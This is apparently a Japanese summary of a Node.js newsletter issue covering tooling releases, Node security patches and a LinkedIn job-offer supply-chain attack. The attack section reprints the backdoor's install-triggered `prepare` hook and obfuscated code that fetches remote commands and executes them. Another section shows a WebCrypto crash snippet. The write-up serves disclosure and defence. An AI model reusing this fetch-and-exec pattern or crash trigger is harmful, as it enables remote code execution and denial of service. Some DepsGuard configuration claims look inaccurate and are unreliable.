# Node Weekly Issue #629 まとめ
**タイトル: Extending Node instead of replacing it**
**発行日: 2026年6月（推定 6月18日〜25日頃）**
**URL: https://nodeweekly.com/issues/629**

---

## 1. Nub: Nodeを拡張するオールインワンツールキット

### ① 目的・問題意識

Bun や Deno などの「Node.js を置き換える」ランタイムが登場する中、既存の Node.js エコシステムとの互換性を維持しながら、TypeScript のネイティブ実行・高速スクリプト実行・パッケージ管理の刷新を実現したいというニーズがある。Nub はその問いへの回答として「Node を置き換えるのではなく拡張する」アプローチを取る。

### ② 具体的な技術詳細

Nub は Rust 製 CLI で、`node`・`npm run`・`npx` の代替として機能する。内部的にはコードを stock Node.js 上でトランスパイルして実行するため、Nub 自体は「ランタイム」ではない。

**主な機能:**
- TypeScript / JSX / デコレーター / `.env` ファイル / YAML・TOML インポート / 最新 ECMA 構文をサポート
- Rust 製パッケージマネージャ `aube` を内蔵（高速・セキュアなインストール）
- pnpm 互換のワークスペース機能: `-r`, `--filter`, `--parallel`, `--workspace-concurrency`, `--resume-from`, `--stream`
- Node バージョン管理機能を内蔵

**インストール:**
```bash
npm install -g --ignore-scripts=false @nubjs/nub
```

**TypeScript をそのまま実行する例:**
```bash
# 従来: tsc でコンパイル後に node で実行
tsc && node dist/index.js

# Nub を使う場合: トランスパイルを自動処理
nub run index.ts
```

**パッケージのインストール:**
```bash
nub install          # 高速インストール (aube engine)
nub install express  # 個別パッケージ追加
```

**スクリプト実行:**
```bash
nub run build        # package.json の scripts を実行
nub exec jest        # bin の直接実行
```

### ③ なぜ効果的か

Nub は Node.js 本体を書き換えず、既存の npm エコシステムをそのまま活用できる。TypeScript サポートをトランスパイル層として透過的に提供し、既存ライブラリとの互換性を壊さない。「大移行コスト不要でモダン DX を得る」という実利的なアプローチが特徴。

- **GitHub:** https://github.com/nubjs/nub
- **公式サイト:** https://nubjs.com/

---

## 2. Node.js June 2026 セキュリティリリース（12件の CVE）

### ① 目的・問題意識

2026年6月18日、Node.js プロジェクトはサポート中の全リリースライン（Node 22・24・26）に対して一斉にセキュリティアップデートを公開した。12件の CVE のうち 2件は HIGH 評価で、即時パッチが推奨される。Node 20 は 2026年4月30日に EOL となったため対象外。

### ② 具体的な技術詳細

**リリースバージョン:**
| バージョン | コードネーム |
|-----------|-------------|
| 22.23.0 | Jod |
| 24.17.0 | Krypton |
| 26.3.1 | Current |

**HIGH 評価の 2件:**

**CVE-2026-48933 (WebCrypto クラッシュ)**
- `subtle.encrypt()` の入力が **2GiB の倍数** になると、Node プロセスがアボートする
- 攻撃者が大きなサイズの暗号化リクエストを送ることで DoS が可能

```javascript
// 脆弱なパターン（2GiB の倍数サイズの入力を渡す）
const { subtle } = globalThis.crypto;
const key = await subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt']);
const bigData = new Uint8Array(2 * 1024 * 1024 * 1024); // 2GiB
await subtle.encrypt({ name: 'AES-GCM', iv: new Uint8Array(12) }, key, bigData);
// → プロセスがクラッシュする
```

**CVE-2026-48618 (TLS ワイルドカード証明書バイパス)**
- TLS ホスト名正規化の欠陥により、ワイルドカード証明書の検証をバイパスできる
- マルチテナント SaaS で最も一般的な証明書パターンに影響

**その他の影響サブシステム:**
- HTTP/2: サーバーが無制限に ORIGIN フレームを送信し、クライアントの OOM を引き起こす可能性
- HTTP, DNS, Permission Model にも複数の CVE

**パッチ適用コマンド:**
```bash
# Node バージョンマネージャ (nvm) を使っている場合
nvm install 22.23.0
nvm install 24.17.0
nvm install 26.3.1
```

### ③ なぜ効果的か

全サポートラインへの同時パッチで運用者が選択に迷わない。特に WebCrypto と TLS は広く使われているため、影響範囲が大きく緊急性が高い。

- **公式リリースノート:** https://nodejs.org/en/blog/vulnerability/june-2026-security-releases

---

## 3. Babel 8.0 正式リリース：ESM Only・ES5 デフォルト廃止

### ① 目的・問題意識

Babel 7 は CJS（CommonJS）出力・ES5 へのデフォルトコンパイルなど、古い慣習を引きずっていた。全 LTS Node.js で `require(esm)` が使えるようになった今、Babel 8 はモダン JS に全振りし、技術的負債を清算する。リリースは 2026年6月16日。

### ② 具体的な技術詳細

**3大 Breaking Changes:**

**1. ESM Only**
Babel 8 のすべてのパッケージが ESM のみ。TypeScript 型も同梱。

```javascript
// Babel 7: CJS でも動作
const babel = require('@babel/core');

// Babel 8: ESM のみ
import * as babel from '@babel/core';
```

**2. デフォルトターゲットの変更**
```javascript
// Babel 7 のデフォルト（全ブラウザ対象）
targets: ">= 0%"

// Babel 8 のデフォルト（現実的な主要ブラウザ）
targets: "defaults"
```

これにより生成コードが大幅にスリムになる。

**3. ポリフィル設定の変更**
`@babel/plugin-transform-runtime` と `@babel/preset-env` の `corejs`/`useBuiltIns` オプションが廃止。

```javascript
// Babel 7: preset-env でポリフィル設定
{
  "presets": [
    ["@babel/preset-env", {
      "useBuiltIns": "usage",
      "corejs": 3
    }]
  ]
}

// Babel 8: babel-plugin-polyfill-corejs3 を使用
{
  "plugins": [
    ["babel-plugin-polyfill-corejs3", {
      "method": "usage-global"
    }]
  ]
}
```

**`loose`・`spec` オプション廃止 → `assumptions` に統一:**
```javascript
// Babel 8
{
  "assumptions": {
    "setPublicClassFields": true,
    "privateFieldsAsSymbols": true
  }
}
```

**Node.js 要件:** `^22.18.0 || >=24.11.0`

**マイグレーション:**
```bash
npx babel-upgrade@latest
```

### ③ なぜ効果的か

Babel 8 は新機能ゼロだが、ESM 化・型同梱・ES5 脱却により、パッケージサイズ削減とツールチェーン近代化を実現。過去の移行（5→6、6→7）より破壊的変更が少なく、段階的移行が可能。週 6.5 億 DL という規模での ESM 移行事例として業界標準を牽引する。

- **公式ブログ:** https://babeljs.io/blog/2026/06/16/8.0.0/
- **マイグレーションガイド:** https://babeljs.io/docs/v8-migration/

---

## 4. LinkedIn 求人オファーに仕込まれたバックドア

### ① 目的・問題意識

ソーシャルエンジニアリングによるサプライチェーン攻撃の実例報告。偽のリクルーターが「コードレビューを依頼する」形で開発者に悪意あるリポジトリを `npm install` させ、リモートコード実行（RCE）バックドアを起動させる手口。Roman Imankulov 氏の実体験レポート。

### ② 具体的な技術詳細

**攻撃の流れ:**
1. LinkedInで「フリーランス案件・年収 $600,000〜$800,000」のメッセージが届く
2. 「面接前にコードを確認してほしい」と GitHub リポジトリを送付
3. 「非推奨の Node モジュール問題を確認してほしい」という指示が `npm install` の実行を誘導するためのエサ

**`package.json` に仕込まれた罠:**
```json
{
  "scripts": {
    "prepare": "node app/index.js"
  }
}
```

npm は `npm install` の後に自動で `prepare` スクリプトを実行する。つまり **インストールするだけでバックドアが起動する**。

**悪意あるコード（`app/test/index.js`）:**
```javascript
// 約250行のテストスイートに見せかけたコードの中に埋め込まれた実行部
// URLをフラグメントから組み立てて難読化
const parts = ['https://rest-', 'icon-handler', '.store/icons/', '77'];
const url = parts.join('');

// リモートサーバーからコマンドを受信して実行
fetch(url)
  .then(res => res.text())
  .then(cmd => {
    const { exec } = require('child_process');
    exec(cmd, (err, stdout) => {
      // 実行結果をサーバーに送信
    });
  });
```

コードはコメントアウトされたテストの間に埋め込まれ、コードレビューで見落としやすい形になっていた。

**なりすまし工作:**
- コミットの author 名・メール は実在する開発者のものを使用
- その開発者に連絡すると「自分はここで働いたことがない」と回答
- 偽のリクルーターの LinkedIn プロフィールも実在人物に偽装

**発見の経緯:**
著者は直接クローンせず、Hetzner の使い捨て VPS 上でリポジトリを展開し、ファイル読み取りのみ可能にした AI エージェントに分析させた。エージェントは `app/test/index.js` でほぼ即座に停止した。

### ③ なぜ効果的か

この攻撃は Microsoft が「Contagious Interview」と名付けた手法で、2022年12月から継続している。`prepare` スクリプトの自動実行という npm の正規機能を悪用しており、コードレビューと `npm install` の間に本来存在すべき安全策が機能しない。

**防御策:**
```bash
# npm の lifecycle スクリプトを無効化
npm install --ignore-scripts

# または .npmrc に設定
ignore-scripts=true
```

- **元記事:** https://roman.pt/posts/linkedin-backdoor/
- **Hacker News 議論:** https://news.ycombinator.com/item?id=48546294

---

## 5. Node.js がメジャーリリースを年 1回に変更（Node 27 から）

### ① 目的・問題意識

従来の「年 2回のメジャーリリース（奇数番号は実験的）」モデルでは、奇数番号リリース（例: Node 21, 23, 25）の採用率が極めて低く、コミュニティのリソースが分散するという問題があった。2026年3月10日に公式ブログで発表。

### ② 具体的な技術詳細

**新しいリリーススケジュール（Node 27 から適用）:**

| フェーズ | 期間 | 内容 |
|---------|------|------|
| Alpha | 6ヶ月 | semver-major 変更を許容 (`27.0.0-alpha.1` 形式) |
| Current | 6ヶ月 | 安定リリース |
| LTS | 30ヶ月 | 長期サポート（全リリースが LTS に昇格） |
| 合計 | 36ヶ月 | EOL まで |

**バージョン番号の変更:**
```
Node 27.0.0 → 2027年リリース（2027年4月）
Node 28.0.0 → 2028年リリース（2028年4月）
```

**旧モデルとの比較:**
```
旧: Node 25 (奇数=実験的) → Node 26 (偶数=LTS候補) → 年2回
新: Node 27 → 年1回、全リリースが LTS 昇格対象
```

Node 26（2026年4月リリース）が旧モデル最後のリリース。

### ③ なぜ効果的か

奇数/偶数の区別廃止により、ユーザーが「今どれを使うべきか」で迷わなくなる。Alpha フェーズが実験的ランタイムの役割を引き継ぎ、より整理されたサポートポリシーを実現。

- **公式発表:** https://nodejs.org/en/blog/announcements/evolving-the-nodejs-release-schedule
- **InfoQ 解説:** https://www.infoq.com/news/2026/06/nodejs-release-changes/

---

## 6. DepsGuard：npm/pnpm/Yarn/Bun の設定をワンコマンドで強化

### ① 目的・問題意識

2026年3月31日の axios サプライチェーン攻撃（ハイジャックされたメンテナアカウントが悪意あるバージョンを公開、約3時間で削除）を直接の契機として開発された。パッケージマネージャのセキュリティ設定は本来有効にすべきだったのに、ほとんどのプロジェクトで設定されていない。

### ② 具体的な技術詳細

**インストールと実行:**
```bash
# 確認のみ（変更なし）
npx depsguard check

# 対話式で設定を適用
npx depsguard harden

# 特定パッケージマネージャのみ
npx depsguard harden --pm npm
```

**DepsGuard が適用するセキュリティ設定:**

**1. リリースエージゲート（7日間の遅延）**
```ini
# .npmrc
install-strategy=offline
prefer-offline=true
```
新しく公開されたパッケージを即座にインストールしない。最も一般的なサプライチェーン攻撃（タイポスクワッティング・ハイジャック）への対策。

**2. postinstall スクリプトの無効化**
```ini
# .npmrc
ignore-scripts=true

# pnpm の場合 (.npmrc)
enable-pre-post-scripts=false
```

**3. プロベナンス検証（pnpm）**
```yaml
# pnpm-workspace.yaml
overrides:
  # provenance 必須設定
```

**4. Renovate / Dependabot の設定スキャン**
既存の自動更新設定もチェックし、推奨設定との差分を報告。

**DepsGuard が対応するツール:**
`npm`, `pnpm`, `yarn`, `bun`, `aube`, `uv` (Python), `pip`, `poetry`

**動作方式:**
1. 各パッケージマネージャの設定ファイルを読み込む
2. 推奨セキュリティ設定と比較
3. 変更前にバックアップを作成し、ユーザー承認の上で適用

### ③ なぜ効果的か

CVE スキャナーとは異なり「そもそも悪意あるコードが実行される前に止める」設定を強制する。Rust 製でゼロ依存、macOS・Linux・Windows 対応、MIT ライセンス。

- **公式サイト:** https://depsguard.com/
- **GitHub:** https://github.com/arnica/depsguard

---

## 7. Express.js の新しいルックと新章

### ① 目的・問題意識

Express は Node.js 最初期から存在するウェブフレームワークだが、長年ウェブサイト・ドキュメント・ブランドが古いままだった。コミュニティ主導の約1年以上の取り組みにより、完全リニューアルを実施（2026年5月18日発表）。

### ② 具体的な技術詳細

**新機能・改善点:**

**マルチバージョンドキュメント:**
```
expressjs.com/en/4x/api.html  # Express 4 のドキュメント
expressjs.com/en/5x/api.html  # Express 5 のドキュメント
```
サイドバーでバージョンを切り替え可能。実際に使っているバージョンのドキュメントを参照できる。

**AI 対応検索（Orama 使用）:**
- キーワード検索から自然言語での質問に対応
- ドキュメント内から文脈に沿った回答を生成

**llms.txt エンドポイント:**
```
expressjs.com/llms.txt
```
LLM ツールがドキュメントを直接読み込めるエンドポイントを提供。

**新ロゴとビジュアルアイデンティティ:**
ブランドワークショップを経て、Express のミニマリズムを踏襲した新しいロゴを導入。

**貢献者:**
- Sebastian Beltran（リード）
- Francesca Giannino（デザイン・UI）
- Angela Angelini・Davide Spaziani（ブランドワークショップ）

### ③ なぜ効果的か

週数百万 DL を誇るフレームワークのドキュメント刷新は、入門者・ベテラン双方の体験向上に直結する。llms.txt 対応により AI 支援コーディングツールとの統合も強化。

- **公式ブログ:** https://expressjs.com/en/blog/2026-05-18-a-new-look-for-express/

---

## 8. Kanel 4.0：PostgreSQL から TypeScript 型を自動生成

### ① 目的・問題意識

PostgreSQL スキーマと TypeScript の型定義を手動で同期するのは手間がかかり、ズレが生じやすい。Kanel は生きたデータベースを検査して TypeScript 型を自動生成する「逆 ORM」アプローチを取る。

### ② 具体的な技術詳細

**クイックスタート:**
```bash
npx kanel -d postgresql://localhost:5432/mydb -o ./src/models
```

**インストールと設定:**
```bash
npm install -D kanel
```

```javascript
// .kanelrc.js
module.exports = {
  connection: 'postgresql://localhost:5432/mydb',
  outputPath: './src/models',
  schemas: ['public'],
  customTypeMap: {
    'pg_catalog.tsvector': 'string',
    'pg_catalog.bpchar': 'string',
  },
  // Kysely との統合
  preRenderHooks: [makeKyselyHook()],
};
```

**生成される型の例（users テーブルの場合）:**
```typescript
// Selectable: DB から読み取る場合
export interface User {
  id: number;
  name: string;
  email: string;
  created_at: Date;
}

// Insertable: INSERT 時（id は自動生成のため省略可）
export interface NewUser {
  id?: number;
  name: string;
  email: string;
  created_at?: Date;
}

// Updateable: UPDATE 時（全フィールドがオプショナル）
export interface UserUpdate {
  id?: number;
  name?: string;
  email?: string;
  created_at?: Date;
}
```

**Kysely との組み合わせ:**
```typescript
import { Kysely, PostgresDialect } from 'kysely';
import type { User, NewUser } from './models/User';

interface Database {
  users: {
    select: User;
    insert: NewUser;
    update: UserUpdate;
  };
}

const db = new Kysely<Database>({ dialect: new PostgresDialect({ pool }) });

// 完全型安全なクエリ
const users = await db.selectFrom('users').selectAll().execute();
```

**Kanel 4.0 のアーキテクチャ:**
プラグイン可能なジェネレーターシステム
- `PgTsGenerator`: TypeScript 型を生成
- `MarkdownGenerator`: ドキュメントを生成
- カスタムジェネレーター: 任意の言語・形式に対応

### ③ なぜ効果的か

DB スキーマが唯一の真実の源泉となり、型定義との乖離をなくす。INSERT・UPDATE・SELECT それぞれで異なる型を生成するため、実際のユースケースに即した精密な型安全性を実現。

- **GitHub:** https://github.com/kristiandupont/kanel

---

## 9. TypeORM 1.0：10年近い開発を経てついに正式版

### ① 目的・問題意識

TypeORM は 2016年から広く使われてきた TypeScript・JavaScript 向け ORM だが、長年 `0.3.x` に留まり「正式版」が存在しなかった。2024年末に新しいメンテナーチームが参加し、2026年6月についに `1.0` をリリース。

### ② 具体的な技術詳細

**DataMapper パターン:**
```typescript
import { Entity, PrimaryGeneratedColumn, Column, Repository } from 'typeorm';
import { AppDataSource } from './data-source';

@Entity()
export class User {
  @PrimaryGeneratedColumn()
  id: number;

  @Column()
  firstName: string;

  @Column()
  lastName: string;
}

// Repository 経由で操作（エンティティはビジネスロジックを持たない）
const userRepository: Repository<User> = AppDataSource.getRepository(User);

const user = new User();
user.firstName = 'Timber';
user.lastName = 'Saw';
await userRepository.save(user);

const users = await userRepository.find({ where: { firstName: 'Timber' } });
```

**ActiveRecord パターン:**
```typescript
import { Entity, PrimaryGeneratedColumn, Column, BaseEntity } from 'typeorm';

@Entity()
export class User extends BaseEntity {
  @PrimaryGeneratedColumn()
  id: number;

  @Column()
  name: string;

  // エンティティ自身がメソッドを持つ
  static findByName(name: string) {
    return this.findOne({ where: { name } });
  }
}

// 直接メソッドを呼び出す
await User.save({ name: 'Timber' });
const user = await User.findByName('Timber');
```

**TypeORM 1.0 の変更点:**
- 非推奨 API をすべて削除
- ECMAScript 2023 へコンパイル（Node.js 20 以上が必要）
- Node 16・18 のサポート終了
- 多数のバグ修正と新機能

**対応 DB:**
PostgreSQL, MySQL, MariaDB, SQLite, SQL Server, Oracle Database, SAP HANA, MongoDB, Google Cloud Spanner

**2025年の新メンテナーチームの実績:**
- PR マージ数: 575件（前年比 63件から大幅増）
- 解決した Issue: 2,300件以上

### ③ なぜ効果的か

DataMapper と ActiveRecord の両パターンをサポートする珍しい ORM。週約 200 万 DL の巨大なエコシステムを維持しながら `1.0` を出したことで、プロダクション採用への安心感が大幅に向上。

- **公式サイト:** https://typeorm.io/
- **InfoQ 解説:** https://www.infoq.com/news/2026/06/typeorm-1-released/

---

## 10. eslint-plugin-unicorn 67.0：300以上のパワフルな ESLint ルール

### ① 目的・問題意識

ESLint のデフォルトルールセットでは捕捉できない、コード品質・可読性・パフォーマンスに関わる細かな問題を検出するための強力なルール集。Sindre Sorhus が管理するプラグインで、定期的にアップデートされ続けている。

### ② 具体的な技術詳細

**インストールと設定:**
```bash
npm install --save-dev eslint-plugin-unicorn
```

```javascript
// eslint.config.js (ESLint 9 flat config)
import unicorn from 'eslint-plugin-unicorn';

export default [
  unicorn.configs['flat/recommended'],
  {
    rules: {
      // 個別ルールの調整
      'unicorn/prevent-abbreviations': 'off',
      'unicorn/no-array-reduce': 'warn',
    }
  }
];
```

**代表的なルール例:**

```javascript
// ❌ unicorn/prefer-module: CommonJS より ESM を推奨
const path = require('path');

// ✅
import path from 'node:path';

// ❌ unicorn/no-for-loop: 旧来の for ループ
for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);
}

// ✅ for-of を推奨
for (const item of arr) {
  console.log(item);
}

// ❌ unicorn/prefer-ternary: if-else の短縮
let value;
if (condition) {
  value = 'yes';
} else {
  value = 'no';
}

// ✅
const value = condition ? 'yes' : 'no';

// ❌ unicorn/throw-new-error: new なしで Error をスロー
throw Error('message');

// ✅
throw new Error('message');

// ❌ unicorn/prefer-node-protocol: node: プレフィックスなし
import fs from 'fs';

// ✅
import fs from 'node:fs';
```

Version 67.0 では新しいルールが追加され、ルール総数が 300 を超えた。

### ③ なぜ効果的か

ESLint 標準では網羅できない「良い習慣」を自動化する。特に `prefer-node-protocol`（`node:` プレフィックス）や `prefer-module`（ESM 化）など、現代の Node.js ベストプラクティスへの移行を機械的に強制できる点が強力。

- **GitHub:** https://github.com/sindresorhus/eslint-plugin-unicorn

---

## 補足: node_modules をFPS視点で歩き回れるツール

### 概要

`node_modules` ディレクトリ内をブラウザで FPS ゲームのように歩き回るインタラクティブ体験。各パッケージがひとつの「建物」として可視化され、依存関係の規模感を直感的に把握できる。

**特徴:**
- WebGL ベースの 3D レンダリング
- パッケージのサイズを建物の高さで表現
- 歩き回ることでどれだけ大量のパッケージが存在するかを体感

---

*まとめ作成日: 2026-06-29*
*参照: https://nodeweekly.com/issues/629*
